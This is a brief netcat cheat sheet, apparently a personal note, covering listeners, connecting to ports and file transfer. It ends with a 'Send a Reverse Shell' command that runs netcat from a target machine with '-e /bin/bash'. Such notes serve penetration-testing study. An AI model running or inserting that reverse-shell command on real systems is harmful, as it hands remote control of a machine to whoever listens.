# Netcat
Netcat is a tool that reads and writes data across network connections, using TCP or UDP protocol. More information [Link](https://blog.ikuamike.io/posts/2021/netcat/)

## Server Mode
Use netcat to listen for connections. What this does is open a port (either tcp or udp) on the system. By default netcat listens on tcp.

> Basic Listener
```bash
$ nc -lvnp 8080
```

I.e. connect to an arbitrary port on an IP address:

```bash
$ nc [IP] [PORT]
```

## 

Basic Listener

I.e. receive connections on an arbitrary port:

```bash
$ nc -lp [PORT]
```

## 

File Transfer

Setup a listener on host that pushes to an outfile:

```bash
$ nc -lp [PORT] > /path/to/outfile
```

From the client (remote machine), push a file back to the listener:

```bash
$ nc -w3 [IP] [PORT] < /path/to/infile
```

## 

Send a Reverse Shell

From target machine:

```bash
$ nc [HOST_IP] [PORT] -e /bin/bash
```

# 

Tags

[#cheat-sheet](app://obsidian.md/index.html#cheat-sheet)